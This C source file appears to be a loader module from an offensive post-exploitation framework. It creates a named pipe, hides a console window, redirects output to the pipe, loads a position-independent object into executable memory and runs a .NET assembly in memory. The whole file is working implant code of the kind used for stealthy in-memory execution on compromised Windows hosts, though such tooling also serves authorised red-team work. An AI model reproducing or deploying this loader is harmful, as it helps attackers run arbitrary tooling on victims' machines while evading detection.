#include "loader.h"

char _PICO_[0] __attribute__( ( section( "pico" ) ) );
char _ASSEMBLY_[0] __attribute__( ( section( "assembly" ) ) );
char _ASSEMBLY_ARGS_[0] __attribute__( ( section( "assembly_args" ) ) );
char _PIPE_NAME_[0] __attribute__( ( section( "pipe_name" ) ) );

int __tag_dotnet_execute_assembly();

int Initialize( char* name ) {
    HANDLE pipe   = NULL;
    HANDLE window = NULL;

    pipe = CreateNamedPipeA( name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 1024 * 1024, 1024 * 1024, 0, NULL );
    if (pipe == INVALID_HANDLE_VALUE) {
        LOG_ERROR( "CreateNamedPipe failed: %d", GetLastError() );
        return FALSE;
    }

    if (!ConnectNamedPipe( pipe, NULL )) {
        LOG_ERROR( "ConnectNamedPipe failed: %d", GetLastError() );
        return FALSE;
    }

    if (GetConsoleWindow() == NULL) {
        AllocConsole();
        window = GetConsoleWindow();
        if (window != NULL) {
            ShowWindow( window, SW_HIDE );
        }
    }

    SetStdHandle( STD_OUTPUT_HANDLE, pipe );

    return TRUE;
}

void go() {
    IMPORTFUNCS                  funcs;
    DOTNET_EXECUTE_ASSEMBLY_FUNC execute_assembly = NULL;
    char*                        pico_src         = _PICO_;
    char*                        pipe_name        = _PIPE_NAME_;
    _RESOURCE*                   assembly         = (_RESOURCE*)_ASSEMBLY_;
    _RESOURCE*                   assembly_args    = (_RESOURCE*)_ASSEMBLY_ARGS_;

    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

#ifndef _DEBUG
    if (!Initialize( pipe_name )) {
        LOG_ERROR( "Failed to initialize named pipe" );
        return;
    }
#else
    (void)pipe_name;
#endif

    // load pico
    char* pico_data = VirtualAlloc( NULL, PicoDataSize( pico_src ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
    char* pico_code = VirtualAlloc( NULL, PicoCodeSize( pico_src ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
    PicoLoad( &funcs, pico_src, pico_code, pico_data );

    // execute dotnet assembly
    execute_assembly = (DOTNET_EXECUTE_ASSEMBLY_FUNC)PicoGetExport( pico_src, pico_code, __tag_dotnet_execute_assembly() );
    if (!execute_assembly( assembly->value, assembly->length, assembly_args->value, assembly_args->length )) {
        LOG_ERROR( "Failed to execute assembly" );
        return;
    }

    LOG_SUCCESS( "Finished execution" );
}